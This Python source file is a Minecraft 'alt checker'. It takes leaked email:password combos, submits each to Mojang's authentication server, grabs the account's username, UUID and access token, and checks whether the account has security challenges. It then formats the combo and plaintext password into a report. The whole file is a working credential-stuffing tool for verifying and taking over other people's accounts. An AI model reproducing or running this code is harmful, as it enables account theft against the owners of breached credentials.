import random
from requests import Session
import asyncio
from concurrent.futures import ThreadPoolExecutor
import json

path=f"{__file__}".replace("\\", "/")
path=path.replace("/resources/alt_checker.py", "")
sfa_url = 'https://api.mojang.com/user/security/challenges'

class check():
    def __init__(self, loginpassword):
        self.result = self.check_alt(loginpassword)

    def secure_check(self, token):
        session = Session()
        headers = {'Pragma': 'no-cache', "Authorization": f"Bearer {token}"}
        z = session.get(url=sfa_url, headers=headers).text
        return z == '[]'

    def check_alt(self, loginpassword):
        session = Session()
        alt = loginpassword.split(":", 1)
        jsonheaders = {"Content-Type": "application/json", 'Pragma': 'no-cache'}
        email = str(alt[0]).replace("\n", "")
        password = str(alt[1]).replace("\n", "")
        payload = ({
            "agent": {                              
                "name": "Minecraft",                
                "version": 1                                                 
            },
            "username": f"{email}",                                  
            "password": f"{password}",  
            "requestUser": True
        })
        bad = 'Invalid credentials'
        answer = session.post(url="https://authserver.mojang.com/authenticate", json=payload, headers=jsonheaders, timeout=10000)
        if (
            bad in answer.text
            or 'Client sent too many requests too fast.' in answer.text
        ):
            return json.loads(answer.text)["errorMessage"]
        ajson = answer.json()
        username = ajson['availableProfiles'][0]['name']
        token = ajson['accessToken']
        uuid = ajson['availableProfiles'][0]["id"]
        securec = self.secure_check(token)
        return f'''
Original Combo: `{loginpassword}`
Username: `{username}`
UUID: `{uuid}`
Email: `{email}`
Password: `{password}`
Sfa: `{securec}`
'''